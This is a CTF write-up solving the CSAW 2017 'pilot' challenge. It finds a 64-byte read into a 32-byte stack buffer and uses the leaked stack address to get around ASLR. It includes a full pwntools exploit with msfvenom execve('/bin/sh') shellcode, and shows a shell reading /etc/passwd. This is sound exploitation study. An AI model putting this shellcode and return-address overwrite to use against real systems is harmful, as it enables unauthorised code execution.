# Csaw17 Pilot


When I run the binary there's some text output to the terminal. Its looking for us to executate some commands but it also appears to be leaking an address from the program:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pilot$ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffdc10be650
[*]Command:1
[*]There are no commands....
[*]Mission Failed....
```

When asked for a command I just pressed 1 and the response was "there are no commands....". 

I'll check how the binary has been compiled: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pilot$ file pilot && checksec pilot
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/ShellCode/Pilot/pilot'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

From the output we see that the stack is executable and there is only partial RELRO as a protection. since the binary is stripped I'll take a look at the disassembly and decompilation in ghidra to see what it does:

```java
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_004009a6()
             undefined         <UNASSIGNED>   <RETURN>
             undefined         Stack[-0x28]:1 local_28                                XREF[2]:     00400aa4(*), 
                                                                                                   00400acf(*)  
                             FUN_004009a6                                    XREF[3]:     entry:004008cd(*), 00400de0, 
                                                                                          00400e80(*)  
        004009a6 55              PUSH       RBP
        004009a7 48 89 e5        MOV        RBP,RSP
        004009aa 48 83 ec 20     SUB        RSP,0x20
        004009ae 48 8b 05        MOV        RAX,qword ptr [stdout]
                 fb 17 20 00
        004009b5 b9 00 00        MOV        ECX,0x0
                 00 00
        004009ba ba 02 00        MOV        EDX,0x2
                 00 00
        004009bf be 00 00        MOV        ESI,0x0
                 00 00
        004009c4 48 89 c7        MOV        RDI,RAX
        004009c7 e8 34 fe        CALL       <EXTERNAL>::setvbuf                              int setvbuf(FILE * __stream, cha
                 ff ff
        004009cc 48 8b 05        MOV        RAX,qword ptr [stdin]
                 ad 16 20 00
        004009d3 b9 00 00        MOV        ECX,0x0
                 00 00
        004009d8 ba 02 00        MOV        EDX,0x2
                 00 00
        004009dd be 00 00        MOV        ESI,0x0
                 00 00
        004009e2 48 89 c7        MOV        RDI,RAX
        004009e5 e8 16 fe        CALL       <EXTERNAL>::setvbuf                              int setvbuf(FILE * __stream, cha
                 ff ff
        004009ea be 19 0c        MOV        ESI,s_[*]Welcome_DropShip_Pilot..._00400c19      = "[*]Welcome DropShip Pilot..."
                 40 00
        004009ef bf a0 20        MOV        EDI,std::cout
                 60 00
        004009f4 e8 67 fe        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        004009f9 be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        004009fe 48 89 c7        MOV        RDI,RAX
        00400a01 e8 7a fe        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400a06 be 36 0c        MOV        ESI,s_[*]I_am_your_assitant_A.I...._00400c36     = "[*]I am your assitant A.I...."
                 40 00
        00400a0b bf a0 20        MOV        EDI,std::cout
                 60 00
        00400a10 e8 4b fe        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400a15 be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400a1a 48 89 c7        MOV        RDI,RAX
        00400a1d e8 5e fe        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400a22 be 58 0c        MOV        ESI,s_[*]I_will_be_guiding_you_through_00400c58  = "[*]I will be guiding you thro
                 40 00
        00400a27 bf a0 20        MOV        EDI,std::cout
                 60 00
        00400a2c e8 2f fe        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400a31 be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400a36 48 89 c7        MOV        RDI,RAX
        00400a39 e8 42 fe        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400a3e be 90 0c        MOV        ESI,s_[*]As_a_first_step,_lets_learn_h_00400c90  = "[*]As a first step, lets lear
                 40 00
        00400a43 bf a0 20        MOV        EDI,std::cout
                 60 00
        00400a48 e8 13 fe        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400a4d be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400a52 48 89 c7        MOV        RDI,RAX
        00400a55 e8 26 fe        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400a5a be e0 0c        MOV        ESI,s_[*]Your_mission_is_to_lead_the_d_00400ce0  = "[*]Your mission is to lead th
                 40 00
        00400a5f bf a0 20        MOV        EDI,std::cout
                 60 00
        00400a64 e8 f7 fd        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400a69 be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400a6e 48 89 c7        MOV        RDI,RAX
        00400a71 e8 0a fe        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400a76 be 5f 0d        MOV        ESI,s_[*]Good_Luck_Pilot!...._00400d5f           = "[*]Good Luck Pilot!...."
                 40 00
        00400a7b bf a0 20        MOV        EDI,std::cout
                 60 00
        00400a80 e8 db fd        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400a85 be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400a8a 48 89 c7        MOV        RDI,RAX
        00400a8d e8 ee fd        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400a92 be 77 0d        MOV        ESI,s_[*]Location:_00400d77                      = "[*]Location:"
                 40 00
        00400a97 bf a0 20        MOV        EDI,std::cout
                 60 00
        00400a9c e8 bf fd        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400aa1 48 89 c2        MOV        RDX,RAX
        00400aa4 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]
        00400aa8 48 89 c6        MOV        RSI,RAX
        00400aab 48 89 d7        MOV        RDI,RDX
        00400aae e8 bd fd        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400ab3 be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400ab8 48 89 c7        MOV        RDI,RAX
        00400abb e8 c0 fd        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400ac0 be 84 0d        MOV        ESI,s_[*]Command:_00400d84                       = "[*]Command:"
                 40 00
        00400ac5 bf a0 20        MOV        EDI,std::cout
                 60 00
        00400aca e8 91 fd        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400acf 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]
        00400ad3 ba 40 00        MOV        EDX,0x40
                 00 00
        00400ad8 48 89 c6        MOV        RSI,RAX
        00400adb bf 00 00        MOV        EDI,0x0
                 00 00
        00400ae0 e8 3b fd        CALL       <EXTERNAL>::read                                 ssize_t read(int __fd, void * __
                 ff ff
        00400ae5 48 83 f8 04     CMP        RAX,0x4
        00400ae9 0f 9e c0        SETLE      AL
        00400aec 84 c0           TEST       AL,AL
        00400aee 74 3f           JZ         LAB_00400b2f
        00400af0 be 90 0d        MOV        ESI,s_[*]There_are_no_commands...._00400d90      = "[*]There are no commands...."
                 40 00
        00400af5 bf a0 20        MOV        EDI,std::cout
                 60 00
        00400afa e8 61 fd        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400aff be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400b04 48 89 c7        MOV        RDI,RAX
        00400b07 e8 74 fd        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400b0c be ad 0d        MOV        ESI,s_[*]Mission_Failed...._00400dad             = "[*]Mission Failed...."
                 40 00
        00400b11 bf a0 20        MOV        EDI,std::cout
                 60 00
        00400b16 e8 45 fd        CALL       <EXTERNAL>::std::operator<<                      ostream * operator<<(ostream * p
                 ff ff
        00400b1b be 90 08        MOV        ESI,<EXTERNAL>::std::endl<>
                 40 00
        00400b20 48 89 c7        MOV        RDI,RAX
        00400b23 e8 58 fd        CALL       <EXTERNAL>::std::ostream::operator<<             undefined operator<<(ostream * t
                 ff ff
        00400b28 b8 ff ff        MOV        EAX,0xffffffff
                 ff ff
        00400b2d eb 05           JMP        LAB_00400b34
                             LAB_00400b2f                                    XREF[1]:     00400aee(j)  
        00400b2f b8 00 00        MOV        EAX,0x0
                 00 00
                             LAB_00400b34                                    XREF[1]:     00400b2d(j)  
        00400b34 c9              LEAVE
        00400b35 c3              RET

```

The disassembly is quite large but I've copied it here for reference. Looking at some of the function calls we can see references to `std::cout`, `std::operator`, `read` and `setvbuf`. This tells me that the source was written in C++. We can already tell the program takes input from stdin and outputs the strings we saw when running the binary. Let's take a look at the C++ decompilation:

```c++
undefined8 FUN_004009a6(void)

{
  ostream *poVar1;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined1 local_28 [32];

  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]I am your assitant A.I....");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]I will be guiding you through the tutorial....")
  ;
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,
                           "[*]As a first step, lets learn how to land at the designated location... ."
                          );
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,
                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
                          );
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]Good Luck Pilot!....");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]Location:");
  poVar1 = (ostream *)std::ostream::operator<<(poVar1,local_28);
  std::ostream::operator<<(poVar1,std::endl<>);
  std::operator<<((ostream *)std::cout,"[*]Command:");
  sVar2 = read(0,local_28,0x40);
  if (sVar2 < 5) {
    poVar1 = std::operator<<((ostream *)std::cout,"[*]There are no commands....");
    std::ostream::operator<<(poVar1,std::endl<>);
    poVar1 = std::operator<<((ostream *)std::cout,"[*]Mission Failed....");
    std::ostream::operator<<(poVar1,std::endl<>);
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}

```

The decompilation makes things a lot clearer. There is a lot of text output to the terminal using std::cout, then one call to `read` that takes user input. This will be our entry point into the program. We can see read is called with a size of 0x40 (64 bytes), but the buffer argument given to read is 32 bytes: `undefined1 local_28 [32];`. This will allow us to overflow the local_28 buffer by 32 bytes. Looking at the disassembly we can see user input from read will be stored at `rbp-0x20`. So assuming we send 32 bytes this will take us to rbp, an additional 8 bytes will overwrite rbp, and then we can overwrite the return address with another 8 bytes to point to a function or address of our choosing. I'll run the binary in gdb and test the theory by sending 32 A's and 8 B's. If we are correct rbp should contain eight `0x42` bytes.


```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x29
$rbx   : 0x0
$rcx   : 0x00007ffff79147e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x40
$rsp   : 0x00007fffffffdf20  →  0x4141414141414141 ("AAAAAAAA"?)
$rbp   : 0x00007fffffffdf40  →  0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x00007fffffffdf20  →  0x4141414141414141 ("AAAAAAAA"?)
$rdi   : 0x0
$rip   : 0x0000000000400ae5  →   cmp rax, 0x4
$r8    : 0xb
$r9    : 0x00007fffffffdde0  →  0x0000000000000000
$r10   : 0x00007ffff78065e8  →  0x000f001200001a64
$r11   : 0x246
$r12   : 0x00007fffffffe058  →  0x00007fffffffe385  →  "/home/root-at-iyn/Nightmare/BufferOverflow/ShellCo[...]"
$r13   : 0x00000000004009a6  →   push rbp
$r14   : 0x0
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf20│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
0x00007fffffffdf28│+0x0008: 0x4141414141414141
0x00007fffffffdf30│+0x0010: 0x4141414141414141
0x00007fffffffdf38│+0x0018: 0x4141414141414141
0x00007fffffffdf40│+0x0020: 0x4242424242424242	 ← $rbp
0x00007fffffffdf48│+0x0028: 0x00007ffff7829d0a  →   add BYTE PTR [rax], al
0x00007fffffffdf50│+0x0030: 0x0000000000000000
0x00007fffffffdf58│+0x0038: 0x00000000004009a6  →   push rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ad8                  mov    rsi, rax
     0x400adb                  mov    edi, 0x0
     0x400ae0                  call   0x400820 <read@plt>
 →   0x400ae5                  cmp    rax, 0x4
     0x400ae9                  setle  al
     0x400aec                  test   al, al
     0x400aee                  je     0x400b2f
     0x400af0                  mov    esi, 0x400d90
     0x400af5                  mov    edi, 0x6020a0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pilot", stopped 0x400ae5 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400ae5 → cmp rax, 0x4
[#1] 0x7ffff7829d0a → add BYTE PTR [rax], al

gef➤  x/6gx $rsp
0x7fffffffdf20:	0x4141414141414141	0x4141414141414141
0x7fffffffdf30:	0x4141414141414141	0x4141414141414141
0x7fffffffdf40:	0x4242424242424242	0x00007ffff7829d0a
gef➤  info frame
Stack level 0, frame at 0x7fffffffdf50:
 rip = 0x400ae5; saved rip = 0x7ffff7829d0a
 called by frame at 0x7fffffffdf58
 Arglist at 0x7fffffffdf18, args:
 Locals at 0x7fffffffdf18, Previous frame's sp is 0x7fffffffdf50
 Saved registers:
  rbp at 0x7fffffffdf40, rip at 0x7fffffffdf48
```
So it looks like we're correct. We can see the return address (saved rip) is at 0x7fffffffdf48 on the stack and points to 0x07ffff7829d0a. Just before the return address we can see the 4 B's and 32 A's that were sent to the read function. The next thing to think about is how to solve the challenge. If we can execute instructions on the stack then we can write shellcode, and we can write anything we want. With this type of exploit we can write shellcode to call `system` with `/bin/bash` in the first part of our payload, and point the return address to the start of our payload. This great but one thing you'll notice when running the binary is that although the text segment addresses remain the same, the stack addresses change on each run:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pilot$ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffd08bddf00
[*]Command:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pilot$ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffefa71130
[*]Command:q
[*]There are no commands....
[*]Mission Failed....

```

This is because the binary is compiled to use Address Space Layout Randomization (ASLR) as a security measure, but is not using Position Independent Executable (PIE) protection. If it was compiled with PIE we would see the text segment addresses changing as well. So to get around this, we'll have to find a way of dynamically knowing a stack address when executing our payload. We need to check and see the address printed to the terminal is i.e. `[*]Location:0x7fffefa71130`. If we review the decompilation again we can see that it looks to be printing out the address of where our input starts: 

```c++
poVar1 = (ostream *)std::ostream::operator<<(poVar1,local_28);
```


PoVar1 is the output stream and local_28 is the address of our buffer at rbp-0x20. We can check this in gdb by breaking on `0x400aae`:

```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf20│+0x0000: 0x0000000000000000	 ← $rax, $rsp, $rsi
0x00007fffffffdf28│+0x0008: 0x0000000000000000
0x00007fffffffdf30│+0x0010: 0x0000000000000000
0x00007fffffffdf38│+0x0018: 0x0000000000000000
0x00007fffffffdf40│+0x0020: 0x0000000000000001	 ← $rbp
0x00007fffffffdf48│+0x0028: 0x00007ffff7829d90  →  <__libc_start_call_main+0080> mov edi, eax
0x00007fffffffdf50│+0x0030: 0x0000000000000000
0x00007fffffffdf58│+0x0038: 0x00000000004009a6  →   push rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400aa4                  lea    rax, [rbp-0x20]
     0x400aa8                  mov    rsi, rax
     0x400aab                  mov    rdi, rdx
●→   0x400aae                  call   0x400870 <_ZNSolsEPKv@plt>
   ↳    0x400870 <std::ostream::operator<<(void const*)@plt+0000> jmp    QWORD PTR [rip+0x2017da]        # 0x602050 <_ZNSolsEPKv@got.plt>
        0x400876 <std::ostream::operator<<(void const*)@plt+0006> push   0x7
        0x40087b <std::ostream::operator<<(void const*)@plt+000b> jmp    0x4007f0
        0x400880 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt+0000> jmp    QWORD PTR [rip+0x2017d2]        # 0x602058 <_ZNSolsEPFRSoS_E@got.plt>
        0x400886 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt+0006> push   0x8
        0x40088b <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt+000b> jmp    0x4007f0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
_ZNSolsEPKv@plt (
   $rdi = 0x00000000006020a0 → 0x00007ffff7e23370 → 0x00007ffff7d3b5f0 → <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()+0000> endbr64 ,
   $rsi = 0x00007fffffffdf20 → 0x0000000000000000,
   $rdx = 0x00000000006020a0 → 0x00007ffff7e23370 → 0x00007ffff7d3b5f0 → <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()+0000> endbr64
)

```

We can see that the call to the std::ostream::operator is passing the output stream in rdi for the first argument and 0x00007fffffffdf20 in rsi for the 2nd argument. In the code section of the debug output we see that rbp-0x20 was passed to rax, then to rsi. So this confirms the address 0x00007fffffffdf20 is our buffer. The question is why has `0x00007fffffffdf20` remained the same in the gdb session each time we run it. Apparently gdb turns off ASLR by default to make debugging easier. Either way, we have confirmed that the address we see printed to the terminal `[*]Location:<stack address>` when running the binary is the start of our buffer. This is a stack leak and we can use it in our exploit to bypass ASLR. So we now we just need to write shellcode for a system call and pass it "/bin/bash" as an arg, then add the bytes to the beginning of the exploit and the leaked stack address as the return address. This should give us a shell. 

## Solving the Challenge

I didn't write custom shellcode for this. I tried generating shellcode with pwntools but this turned out to be 48 bytes which was too large for the buffer. In the end I resorted to msfvenom, which I didn't think would work because of a null byte, but the `read` function will fetch all bytes on the input stream until the size specifed. This means that is does not terminate the payload early, which would would have happened on a `strcpy` call. I added the logic in a python script and then debugged the execution:

```python
import re
from pwn import *

target = process("./pilot")

# gdb.attach(target, gdbscript="b *0x400aae")

# Create shellcode for bin/sh using msfvenom (21 bytes)
# msfvenom -p linux/x64/exec -f python
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50" # The null byte doesn't affect it because `read` retrieves all bytes from the fd upto the specified size.
buf += b"\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

# Create shellcode for /bin/sh using pwn tools
# shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64', os='linux') # This created a 48 byte payload and was too large for the buffer


# Stack leak
output = target.recvuntil(b"Command:")
m = re.search(r'(?<=:).+', output.decode('utf-8'))
rbp_0x20 = int(m.group(0), 16)  # convert string to int base-16


# Final payload
payload =  buf + b"A" * (40 - len(buf)) + p64(rbp_0x20)

target.sendline(payload)

target.interactive()
```

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x31              
$rbx   : 0x0               
$rcx   : 0x0000744d759147e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x40              
$rsp   : 0x00007ffcefd500c0  →  0x732f6e69622fb848
$rbp   : 0x00007ffcefd500e0  →  0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007ffcefd500c0  →  0x732f6e69622fb848
$rdi   : 0x0               
$rip   : 0x0000000000400ae5  →   cmp rax, 0x4
$r8    : 0xb               
$r9    : 0x00007ffcefd4ff80  →  0x0000000000000000
$r10   : 0x0000744d758065e8  →  0x000f001200001a64
$r11   : 0x246             
$r12   : 0x00007ffcefd501f8  →  0x00007ffcefd52408  →  0x00746f6c69702f2e ("./pilot"?)
$r13   : 0x00000000004009a6  →   push rbp
$r14   : 0x0               
$r15   : 0x0000744d75f8f040  →  0x0000744d75f902e0  →  0x0000000000000000
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffcefd500c0│+0x0000: 0x732f6e69622fb848	 ← $rsp, $rsi
0x00007ffcefd500c8│+0x0008: 0x5e525f5450990068 ("h"?)
0x00007ffcefd500d0│+0x0010: 0x414141050f583b6a
0x00007ffcefd500d8│+0x0018: 0x4141414141414141
0x00007ffcefd500e0│+0x0020: 0x4141414141414141	 ← $rbp
0x00007ffcefd500e8│+0x0028: 0x00007ffcefd500c0  →  0x732f6e69622fb848
0x00007ffcefd500f0│+0x0030: 0x000000000000000a ("\n"?)
0x00007ffcefd500f8│+0x0038: 0x00000000004009a6  →   push rbp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ad8                  mov    rsi, rax
     0x400adb                  mov    edi, 0x0
     0x400ae0                  call   0x400820 <read@plt>
 →   0x400ae5                  cmp    rax, 0x4
     0x400ae9                  setle  al
     0x400aec                  test   al, al
     0x400aee                  je     0x400b2f
     0x400af0                  mov    esi, 0x400d90
     0x400af5                  mov    edi, 0x6020a0
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pilot", stopped 0x400ae5 in ?? (), reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400ae5 → cmp rax, 0x4
[#1] 0x7ffcefd500c0 → movabs rax, 0x68732f6e69622f
────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7ffcefd500f0:
 rip = 0x400ae5; saved rip = 0x7ffcefd500c0
 called by frame at 0x7ffcefd500f8
 Arglist at 0x7ffcefd500b8, args: 
 Locals at 0x7ffcefd500b8, Previous frame's sp is 0x7ffcefd500f0
 Saved registers:
  rbp at 0x7ffcefd500e0, rip at 0x7ffcefd500e8
```

After sending the payload we can see that it points to the correct return address (saved rip), which is the start of the buffer `0x7ffcefd500c0`. If you continue to step through the code you can see the shellcode instructions:

```sh
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400b2d                  jmp    0x400b34
     0x400b2f                  mov    eax, 0x0
     0x400b34                  leave
 →   0x400b35                  ret
   ↳  0x7ffcefd500c0                  movabs rax, 0x68732f6e69622f
      0x7ffcefd500ca                  cdq
      0x7ffcefd500cb                  push   rax
      0x7ffcefd500cc                  push   rsp
      0x7ffcefd500cd                  pop    rdi
      0x7ffcefd500ce                  push   rdx
```
When I continued in the debug session the binary sigsiev'd at the syscall. However, if you run the exploit without a debug session you get a shell:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pilot$ python3 exploit_pilot.py
[+] Starting local process './pilot': pid 24466
[*] Switching to interactive mode
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
This was my first ASLR challenge I feel like I learned some intersting things. I could probably improve this by experimenting with writing custom shellcode. 


